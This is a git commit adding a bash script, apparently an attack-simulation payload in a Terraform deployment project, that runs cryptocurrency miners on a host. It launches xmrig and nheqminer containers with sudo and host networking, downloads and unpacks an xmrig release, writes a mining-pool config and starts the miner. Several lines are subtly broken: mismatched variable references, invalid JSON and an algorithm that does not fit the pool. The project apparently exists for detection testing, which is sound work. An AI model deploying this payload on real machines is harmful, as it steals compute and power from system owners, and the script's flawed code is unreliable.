24b90ebb84df24d363a82b7b7f74617a4e7bf9b1
credibleforce <58786780+credibleforce@users.noreply.github.com>
2024-10-16 22:28:52 -0700

    add host crypto example

---
+++ terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-host-cryptomining/example.sh
@@ -0,0 +1,30 @@
+#!/bin/bash -x
+
+NICE_HASH_USER="xxxx"
+MINERGATE_USER="xxxx"
+
+# docker                  
+sudo docker run -d --network=host --name xmrig_miner xmrig/xmrig -o us-east.ethash-hub.miningpoolhub.com:20535 -u ${ minergate_user } -p x
+sudo docker run -d --network=host --name nicehash_miner a2ncer/nheqminer_cpu:latest -l :3357 -u ${ nicehash_user }
+
+# local
+curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
+tar xvfz xmrig.tar.gz
+cd xmrig-6.19.2
+cat<<EOF > config.json
+{
+"algo": "cryptonight",
+"pools": [
+    {
+        "url": "us-east.ethash-hub.miningpoolhub.com:20535",
+        "user": "${MINERGATE_USER}",
+        "pass": "x",
+        "enabled": true,
+    }
+],
+"retries": 10,
+"retry-pause": 3,
+"watch": true
+}
+EOF
+./xmrig -c config.json
